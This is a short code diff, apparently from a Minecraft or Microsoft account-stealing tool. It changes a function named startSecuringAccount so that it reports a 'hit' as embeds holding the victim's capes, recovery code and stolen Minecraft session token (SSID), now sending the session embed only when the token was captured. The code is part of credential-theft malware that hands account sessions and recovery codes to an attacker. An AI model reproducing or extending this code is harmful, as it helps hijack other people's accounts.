@@ -29,9 +29,12 @@ def startSecuringAccount(email: str, device: str = None, code: str = None):
     hit_embed.add_field(name = "Capes:\n", value = f"```{account["method"]}```")
     hit_embed.add_field(name = "Recovery Code:\n", value = f"```{account["recoveryCode"]}```")
 
-    session_embed = Embed(
-        title = "Got Session!",
-        description = f"```{account["SSID"]}```"
-    )
+    if account["SSID"] != "Failed to Get":
+        session_embed = Embed(
+            title = f"Got Minecraft Session! | {account["oldName"]}",
+            description = f"```{account["SSID"]}```"
+        )
 
-    return [hit_embed, session_embed]
+        return [hit_embed, session_embed]
+
+    return [hit_embed]
